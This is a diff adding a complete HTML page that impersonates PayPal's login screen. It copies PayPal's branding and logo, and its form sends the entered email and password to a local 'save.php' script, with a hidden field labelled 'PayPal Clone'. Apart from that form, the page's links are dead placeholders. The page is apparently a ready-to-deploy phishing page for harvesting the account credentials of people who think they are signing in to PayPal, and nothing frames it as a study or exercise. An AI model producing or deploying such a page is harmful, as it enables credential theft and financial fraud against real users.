@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>PayPal - Log in to your account</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: Arial, sans-serif;
+    }
+
+    body {
+      background-color: #f7f9fa;
+      color: #333;
+    }
+
+    .wrapper {
+      display: flex;
+      flex-direction: column;
+      min-height: 100vh;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .logo {
+      background: url("https://www.paypalobjects.com/digitalassets/c/website/logo/full-text/pp_fc_hl.svg") no-repeat center;
+      background-size: contain;
+      width: 129px;
+      height: 32px;
+      margin-bottom: 20px;
+    }
+
+    .form-container {
+      background-color: #fff;
+      padding: 30px;
+      border-radius: 6px;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+      width: 90%;
+      max-width: 400px;
+    }
+
+    .form-container input[type="email"],
+    .form-container input[type="password"] {
+      width: 100%;
+      height: 44px;
+      padding: 0 10px;
+      margin-bottom: 15px;
+      border: 1px solid #9da3a6;
+      border-radius: 4px;
+      font-size: 16px;
+    }
+
+    .form-container button {
+      width: 100%;
+      height: 44px;
+      background-color: #0070ba;
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      transition: background-color 0.2s;
+    }
+
+    .form-container button:hover {
+      background-color: #005c99;
+    }
+
+    .forgot {
+      text-align: center;
+      margin: 20px 0;
+    }
+
+    .forgot a {
+      color: #0070ba;
+      text-decoration: none;
+      font-size: 14px;
+    }
+
+    .signup {
+      width: 100%;
+      height: 44px;
+      background-color: #e1e7eb;
+      color: #2c2e2f;
+      border: none;
+      border-radius: 4px;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    footer {
+      text-align: center;
+      font-size: 12px;
+      color: #666;
+      padding: 20px 0;
+    }
+
+    footer a {
+      color: #666;
+      margin: 0 10px;
+      text-decoration: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="wrapper">
+    <div class="logo"></div>
+    <div class="form-container">
+      <form action="save.php" method="post">
+        <input type="hidden" name="source" value="PayPal Clone">
+        <input type="email" name="username" placeholder="Email" required>
+        <input type="password" name="password" placeholder="Password" required>
+        <button type="submit">Log In</button>
+        <div class="forgot">
+          <a href="#">Having trouble logging in?</a>
+        </div>
+      </form>
+      <button class="signup">Sign Up</button>
+    </div>
+    <footer>
+      <a href="#">Contact Us</a>
+      <a href="#">Privacy</a>
+      <a href="#">Legal</a>
+      <a href="#">Worldwide</a>
+    </footer>
+  </div>
+</body>
+</html>
